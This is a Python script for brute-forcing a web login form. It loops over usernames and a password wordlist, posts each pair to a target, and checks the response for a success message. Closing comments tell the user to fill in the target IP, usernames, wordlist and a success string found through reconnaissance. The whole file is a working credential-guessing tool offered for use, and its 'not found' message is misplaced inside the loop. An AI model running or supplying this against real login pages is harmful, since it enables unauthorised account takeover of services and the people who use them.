import requests
import sys

target = "target IP"
usernames = ["list of usernames to try"]
passwords = "passwords list text file to use"
needle = "Welcome back"

#loop through the passwords list
for username in usernames:
    with open(passwords, "r") as passwords_list:
        for password in passwords_list:
            password = password.strip("\n").encode()
            #output progress
            sys.stdout.write("[X] Attempting user:password -> {}:{}\r".format(username, password.decode()))
            #flush the buffer
            sys.stdout.flush()
            #make the post request to target
            r = requests.post(target, data={"username": username, "password": password})
            #check if the needle is in our response
            if needle.encode() in r.content:
                sys.stdout.write("\n")
                sys.stdout.write("\t[>>>>>] Valid password '{}' found for user '{}'!".format(password.decode(), username))
                sys.exit()
            #if no password found flush the buffer and output not found to user
            sys.stdout.flush()
            sys.stdout.write("\n")
            sys.stdout.write("\tNo password found for '{}'!".format(username))
            sys.stdout.write("\n")

#modify line4 to include the target IP
#modify line5 to include a list of usernames to try
#modify line6 by providing the password list text file name
#modify line7 to successful login message found through reconnaissance